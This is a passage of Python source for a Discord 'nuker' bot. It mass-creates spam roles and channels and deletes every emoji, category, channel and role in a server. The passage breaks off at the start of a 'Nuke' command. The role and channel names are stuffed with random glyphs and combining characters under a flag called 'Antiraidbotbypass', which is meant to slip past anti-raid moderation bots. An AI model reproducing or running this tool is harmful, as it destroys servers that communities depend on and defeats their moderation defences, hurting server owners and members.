                    r16 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])

                    if Antiraidbotbypass == True:
                        rolename = r1 + r10 + r2 + r11 + r3 + r12 + r4 + r13 + r5 + r14 + r6 + r15 + r7 + r16 + r8 + r9
                        rolenameprint = r1 + "⚠" + r2 + "⚠" + r3 + "⚠" + r4 + "⚠" + r5 + "⚠" + r6 + "⚠" + r7 + "⚠" + r8 + "⚠"
                    
                    if rainbow == 1:
                        await guild.create_role(name=rolename, colour=discord.Colour(0xff0000)) 
                    if rainbow == 2:
                        await guild.create_role(name=rolename, colour=discord.Colour(0xff8000)) 
                    if rainbow == 3:
                        await guild.create_role(name=rolename, colour=discord.Colour(0xffff00)) 
                    if rainbow == 4:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x80ff00)) 
                    if rainbow == 5:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x00ff00)) 
                    if rainbow == 6:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x00ff80))
                    if rainbow == 7:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x00ffff)) 
                    if rainbow == 8:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x0080ff)) 
                    if rainbow == 9:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x0000ff)) 
                    if rainbow == 10:
                        await guild.create_role(name=rolename, colour=discord.Colour(0x8000ff)) 
                    if rainbow == 11:
                        await guild.create_role(name=rolename, colour=discord.Colour(0xff00ff)) 
                    if rainbow == 12:
                        await guild.create_role(name=rolename, colour=discord.Colour(0xff0080)) 
                    if rainbow == 13:
                        await guild.create_role(name=rolename, colour=discord.Colour(0xff0000)) 
                        rainbow = 0
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " the role '" + rolenameprint + "' was created!")
                    rainbow = rainbow + 1
                    time.sleep(0.3)
                rainbow = 1


            if arg == "channels":
                for i in range (int(arg2)):
                    r1 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r2 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r3 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r4 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r5 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r6 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r7 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r8 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r9 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r10 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r11 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r12 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r13 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r14 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r15 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r16 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    if Antiraidbotbypass == True:
                        Channelname = r1 + r10 + r2 + r11 + r3 + r12 + r4 + r13 + r5 + r14 + r6 + r15 + r7 + r16 + r8 + r9
                    else:
                        from config import channelname
                        Channelnameprint = channelname
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " the channel '" + Channelnameprint + "' was created!")
                    await ctx.message.guild.create_text_channel(Channelname)
            rolename = rolenamesave
            rolenameprint = rolenamesave
            Channelname = Channelnamesave
            Channelnameprint = Channelnamesave
                
    @bot.command()  
    async def Delete(ctx, arg=None):
        guild = ctx.guild
        if ctx.author.id == UserID:
            await ctx.message.delete()
            if arg == "emojis":
                print("----------------------------------------->")
                time.sleep(0.15)
                print("deleting emojis...")
                for emoji in ctx.guild.emojis: 
                    try:  
                        await emoji.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{emoji.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{emoji} (X)" + Fore.RESET)
                print("----------------------------------------->")
            if arg == "categories":
                print("----------------------------------------->")
                time.sleep(0.15)
                print("deleting categories...")
                for category in ctx.guild.categories:  
                    try:  
                        await category.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{category.name} (✓)" + Fore.RESET)
                    except:
                         print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{category} (X)" + Fore.RESET)
                print("----------------------------------------->")
                    
            if arg == "channels":
                print("----------------------------------------->")
                time.sleep(0.15)
                print("deleting channels...")
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{channel.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{channel} (X)" + Fore.RESET)
                print("----------------------------------------->")
                    
            if arg == "roles":
                print("----------------------------------------->")
                time.sleep(0.15)
                print("deleting roles...")
                for role in ctx.guild.roles:  
                    try:  
                        await role.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{role.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{role} (X)" + Fore.RESET)
                print("----------------------------------------->")
    

    @bot.command()  
    async def Nuke(ctx):
        guild = ctx.guild
        if ctx.author.id == UserID:
            await ctx.message.delete()
            try:
                from config import rolename
                rolenamesave = rolename
                rolename = rolenamesave
                rolenameprint = rolenamesave
            except:
                pass
            rainbow = 1
            print("----------------------------------------->")
            time.sleep(0.15)
            print("deleting categories...")
            for category in ctx.guild.categories:  
